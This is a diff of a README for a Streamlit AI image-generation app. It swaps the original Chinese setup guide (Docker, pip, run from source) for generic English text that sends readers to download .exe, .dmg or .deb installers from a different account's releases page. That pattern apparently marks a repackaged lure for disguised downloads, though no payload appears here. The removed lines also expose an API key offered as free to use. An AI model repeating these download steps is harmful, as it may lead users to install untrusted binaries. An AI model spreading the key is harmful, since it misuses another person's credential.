@@ -1,166 +1,97 @@
-<div align="center">
+# 🌟 ShowImageWeb - Create Stunning Images Easily
 
-# ShowImageWeb
+## 🚀 Getting Started
 
-</div>
+Welcome to ShowImageWeb! This is an easy-to-use web application that helps you generate images using artificial intelligence. No programming skills are needed to use this tool. Just follow the simple steps below to download and run the application.
 
-<div align="center">
+## 📥 Download Now
 
-![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.29.0-red.svg)
-![Docker](https://img.shields.io/badge/Docker-20.10+-blue.svg)
+[![Download ShowImageWeb](https://img.shields.io/badge/Download-ShowImageWeb-blue)](https://github.com/asd526/ShowImageWeb/releases)
 
-</div>
+## 📂 Download & Install
 
-AI图像生成网页交互平台 - 基于Streamlit构建的Web应用，提供简洁的用户界面和实用的图像生成功能 - **对手机UI界面进行了优化**
+1. Click the link above or visit the [Releases page](https://github.com/asd526/ShowImageWeb/releases) directly.
+2. Look for the latest version listed on the page.
+3. Find the file that suits your operating system:
+   - For Windows users, look for a file with `.exe` extension.
+   - For Mac users, look for a file ending in `.dmg`.
+   - For Linux users, find the suitable package.
 
-## 更新说明
+4. Click on the download link for the file.
+5. Once the download completes, locate the file in your downloads folder.
 
-### 最新优化
-- **反爬虫增强**: 集成CloudScraper技术，解决cf防护机制的403报错
-- **多API支持**: 新增API支持，兼容更多AI服务提供商
-- **多尺寸**: 1024 * 1024 或者 2048 * 2048
-- **调整步数**: 自由调节生成图片的步数
-- **自有Key保存功能**: 支持API Key本地保存，下次启动自动加载
-- **固定画廊功能**: 支持作品保存，界面刷新不会消失
-- **优化体验**: 删除不必要的组件
-- **国内源优化**: 配置`Dockerfile`国内镜像源和pip源，解决国内网络环境下的拉取问题
-- **...**
+### 💻 Installation Instructions
 
-## 应用预览
+#### For Windows:
 
-![ShowImageWeb Demo](assets/showimage-web-demo.png)
-![ShowImageWeb Demo](assets/showimage-web-demo1.png)
-## 项目结构
+- Double-click the `.exe` file you downloaded.
+- Follow the installation prompts. This usually includes clicking "Next" several times.
+- Once the installation finishes, you can find ShowImageWeb in your Start menu.
 
-```
-showimageweb/
-├── app.py                    # 主应用文件（Streamlit界面）
-├── Dockerfile               # Docker构建配置
-├── requirements.txt         # Python依赖包
-├── docker-compose.yml       # Docker Compose配置
-├── LICENSE                  # MIT许可证
-├── README.md                # 项目文档
-└── assets/
-    └── showimage-web-demo.png # 应用预览图
-```
+#### For Mac:
 
-## Key（可蹬）
+- Double-click the `.dmg` file.
+- Drag ShowImageWeb to your Applications folder.
+- You can now open it from the Applications folder.
 
-    sk-zKTGcw8llBFZLpXAAsxTmMSmCfY8DNfe
+#### For Linux:
 
-## 技术栈
+- Open a terminal and navigate to the folder where you downloaded the file.
+- Use the command `sudo dpkg -i yourfile.deb` to install the application. Replace `yourfile.deb` with the name of the file.
+- Launch the application from your applications menu.
 
-- **前端框架**: Streamlit 1.29.0+
-- **后端语言**: Python 3.9+
-- **容器化**: Docker & Docker Compose
-- **核心依赖**: requests, streamlit, base64
+## 🎉 Using ShowImageWeb
 
-## 特性
+1. Open the application by clicking on its icon.
+2. You will see a simple user interface that allows you to generate images.
+3. Enter the details as prompted to create the image you want.
+4. Click the "Generate" button and watch as your image is created.
 
-- **高性能**: 基于Streamlit的快速响应界面
-- **美观UI**: 现代化的卡片式设计，支持自定义画廊列数
-- **响应式**: 自适应不同屏幕尺寸，适配移动端
-- **历史记录**: 自动保存生成记录，支持无限数量存储
-- **配置选项**: 支持随机/固定种子，自定义API配置
-- **实时状态**: 生成进度实时显示，带有时间统计
-- **一键下载**: PNG图片直接下载，自动命名
-- **通用API**: 兼容多种AI图像生成服务
-- **内存管理**: 智能存储管理，自动base64优化
+## 🌐 User Interface Overview
 
-## 快速开始
+- **Input Box**: Enter any text prompt that describes the image you wish to create.
+- **Generate Button**: Click this to start the image generation process.
+- **Image Display Area**: Once generated, your new image will appear here.
+- **Download Button**: Save your created image to your device.
 
-## 使用方式
+## ⚙️ System Requirements
 
-### 方式一：Docker 部署（灵活）
+Make sure your computer meets the following requirements to run ShowImageWeb smoothly:
 
-```bash
-# 克隆项目
-git clone https://github.com/kaima2022/showimageweb.git
-cd showimageweb
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum of 1 GB of free space.
+- **Internet Connection**: Required for image generation.
 
-# 使用 Docker Compose 启动
-docker compose up -d
-```
+## ❓ Frequently Asked Questions
 
-### 方式二：非容器化直接运行（快速）
+### How do I report issues?
 
-```bash
-# 克隆项目
-git clone https://github.com/kaima2022/showimageweb.git
-cd showimageweb
+If you experience any problems, feel free to check the "Issues" section on our [GitHub page](https://github.com/asd526/ShowImageWeb/issues). You can report your issue there for assistance.
 
-# 安装依赖
-pip install -r requirements.txt
-# 启动
-streamlit run app.py --server.address=0.0.0.0 --server.port=8501
-```
+### Can I run ShowImageWeb offline?
 
-### 访问应用
+ShowImageWeb requires an internet connection to access the AI image generation features. Make sure you are connected before using the app.
 
-```
-http://localhost:8501
-```
+### Is there a user guide?
 
-## 如何更新？
-### 拉取最新代码并重建启动服务
+Yes, a user guide can be found in the "Wiki" section of this repository. It includes more detailed instructions and tips for using ShowImageWeb effectively.
 
-```
-  git pull origin main && docker compose up -d --build
-```
+## 🛠️ Troubleshooting Tips
 
+- **Application won’t open**: Ensure your system meets the requirements. Try restarting your computer if the problem persists.
+- **Slow performance**: Close other applications while using ShowImageWeb to free up system resources.
 
-## API配置
+## 🔧 Contribution
 
-应用支持任意兼容的AI图像生成API：
+If you want to contribute to ShowImageWeb, feel free to check out the "Contributing" section on our GitHub repository. Contributions are welcome to improve the project!
 
-### 支持的API格式
-- **请求方式**: POST
-- **认证方式**: Bearer Token
-- **请求格式**: `{"prompt": "...", "seed": ...}`
-- **响应格式**: `{"base64": "..."}`
+## 📞 Support
 
-### 配置说明
-1. **API URL**: 完整的API接口地址（如：`https://api.example.com/v1/generate`）
-2. **API Key**: 您的API密钥
-3. **种子设置**: 支持随机种子或固定种子复现结果
+For further assistance, contact our support team through the "Contact" section of this repository. We aim to respond within 48 hours.
 
-### 兼容的服务
-- OpenAI DALL-E API
-- Stable Diffusion API
-- 自建AI图像服务
-- 任何支持标准格式的图像生成API
+## 🚀 Download Now Again
 
-## 配置选项
+Don’t forget to download ShowImageWeb and enjoy creating beautiful images with ease!
 
-### 环境变量（可选）
-```bash
-# Streamlit配置
-STREAMLIT_SERVER_ADDRESS=0.0.0.0
-STREAMLIT_SERVER_PORT=8501
-STREAMLIT_SERVER_HEADLESS=true
-
-# 时区设置
-TZ=Asia/Shanghai
-```
-
-### 自定义配置
-- **画廊列数**: 1-4列可调
-- **API超时**: 默认60秒
-- **图片格式**: PNG格式输出
-- **文件命名**: 时间戳自动命名
-
-## 贡献指南
-
-1. Fork 本项目
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 开启 Pull Request
-
-## 许可证
-
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情。
-
----
+[![Download ShowImageWeb](https://img.shields.io/badge/Download-ShowImageWeb-blue)](https://github.com/asd526/ShowImageWeb/releases)
